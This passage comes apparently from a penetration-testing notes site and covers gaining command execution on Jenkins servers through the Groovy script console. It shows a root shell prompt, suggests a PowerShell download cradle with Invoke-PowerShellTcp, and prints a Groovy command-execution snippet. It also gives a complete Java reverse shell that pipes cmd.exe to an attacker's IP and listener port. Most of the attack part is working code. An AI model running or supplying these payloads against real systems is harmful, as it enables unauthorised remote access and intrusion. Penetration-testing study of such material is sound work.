<a id=__codelineno-24-10 name=__codelineno-24-10 href=#__codelineno-24-10></a><span class=go>/bin/bash -i</span>
<a id=__codelineno-24-11 name=__codelineno-24-11 href=#__codelineno-24-11></a>
<a id=__codelineno-24-12 name=__codelineno-24-12 href=#__codelineno-24-12></a><span class=gp>root@app02:/var/lib/jenkins3#</span>
</code></pre></div> <p>Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with <a href=https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1>Invoke-PowerShellTcp.ps1</a>. We could run commands on a Windows-based Jenkins install using this snippet:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-25-1 name=__codelineno-25-1 href=#__codelineno-25-1></a><span class=go>def cmd = &quot;cmd.exe /c dir&quot;.execute();</span>
<a id=__codelineno-25-2 name=__codelineno-25-2 href=#__codelineno-25-2></a><span class=go>println(&quot;${cmd.text}&quot;);</span>
</code></pre></div> <p>We could also use <a href=https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy>this</a> Java reverse shell to gain command execution on a Windows host, swapping out <strong>localhost</strong> and the port for our IP address and listener port.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-26-1 name=__codelineno-26-1 href=#__codelineno-26-1></a><span class=n>String</span><span class=w> </span><span class=n>host</span><span class=o>=</span><span class=s2>&quot;localhost&quot;</span><span class=o>;</span><span class=w></span>
<a id=__codelineno-26-2 name=__codelineno-26-2 href=#__codelineno-26-2></a><span class=kt>int</span><span class=w> </span><span class=n>port</span><span class=o>=</span><span class=mi>8044</span><span class=o>;</span><span class=w></span>
<a id=__codelineno-26-3 name=__codelineno-26-3 href=#__codelineno-26-3></a><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=o>=</span><span class=s2>&quot;cmd.exe&quot;</span><span class=o>;</span><span class=w></span>
<a id=__codelineno-26-4 name=__codelineno-26-4 href=#__codelineno-26-4></a><span class=n>Process</span><span class=w> </span><span class=n>p</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ProcessBuilder</span><span class=o>(</span><span class=n>cmd</span><span class=o>).</span><span class=na>redirectErrorStream</span><span class=o>(</span><span class=kc>true</span><span class=o>).</span><span class=na>start</span><span class=o>();</span><span class=n>Socket</span><span class=w> </span><span class=n>s</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>Socket</span><span class=o>(</span><span class=n>host</span><span class=o>,</span><span class=n>port</span><span class=o>);</span><span class=n>InputStream</span><span class=w> </span><span class=n>pi</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>(),</span><span class=n>pe</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=na>getErrorStream</span><span class=o>(),</span><span class=w> </span><span class=n>si</span><span class=o>=</span><span class=n>s</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span><span class=n>OutputStream</span><span class=w> </span><span class=n>po</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=na>getOutputStream</span><span class=o>(),</span><span class=n>so</span><span class=o>=</span><span class=n>s</span><span class=o>.</span><span class=na>getOutputStream</span><span class=o>();</span><span class=k>while</span><span class=o>(!</span><span class=n>s</span><span class=o>.</span><span class=na>isClosed</span><span class=o>()){</span><span class=k>while</span><span class=o>(</span><span class=n>pi</span><span class=o>.</span><span class=na>available</span><span class=o>()&gt;</span><span class=mi>0</span><span class=o>)</span><span class=n>so</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>pi</span><span class=o>.</span><span class=na>read</span><span class=o>());</span><span class=k>while</span><span class=o>(</span><span class=n>pe</span><span class=o>.</span><span class=na>available</span><span class=o>()&gt;</span><span class=mi>0</span><span class=o>)</span><span class=n>so</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>pe</span><span class=o>.</span><span class=na>read</span><span class=o>());</span><span class=k>while</span><span class=o>(</span><span class=n>si</span><span class=o>.</span><span class=na>available</span><span class=o>()&gt;</span><span class=mi>0</span><span class=o>)</span><span class=n>po</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>si</span><span class=o>.</span><span class=na>read</span><span class=o>());</span><span class=n>so</span><span class=o>.</span><span class=na>flush</span><span class=o>();</span><span class=n>po</span><span class=o>.</span><span class=na>flush</span><span class=o>();</span><span class=n>Thread</span><span class=o>.</span><span class=na>sleep</span><span class=o>(</span><span class=mi>50</span><span class=o>);</span><span class=k>try</span><span class=w> </span><span class=o>{</span><span class=n>p</span><span class=o>.</span><span class=na>exitValue</span><span class=o>();</span><span class=k>break</span><span class=o>;}</span><span class=k>catch</span><span class=w> </span><span class=o>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=o>){}};</span><span class=n>p</span><span class=o>.</span><span class=na>destroy</span><span class=o>();</span><span class=n>s</span><span class=o>.</span><span class=na>close</span><span class=o>();</span><span class=w></span>
</code></pre></div> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top data-md-state=hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../content_management_systems/ class="md-footer__link md-footer__link--prev" aria-label="Previous: Content Management Systems" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> Content Management Systems </div> </div> </a> <a href=../infra_network_monitoring_tools/ class="md-footer__link md-footer__link--next" aria-label="Next: Infrastructure/Network Monitoring Tools" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> Infrastructure/Network Monitoring Tools </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2021 - 2022 dh </div> </div> <div class=md-social> <a href=https://github.com/hrmnsio target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> <a href=https://twitter.com/dhrmns target=_blank rel=noopener title=twitter.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["content.code.annotate", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.361d90f1.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../assets/javascripts/bundle.289a2a4b.min.js></script> </body> </html>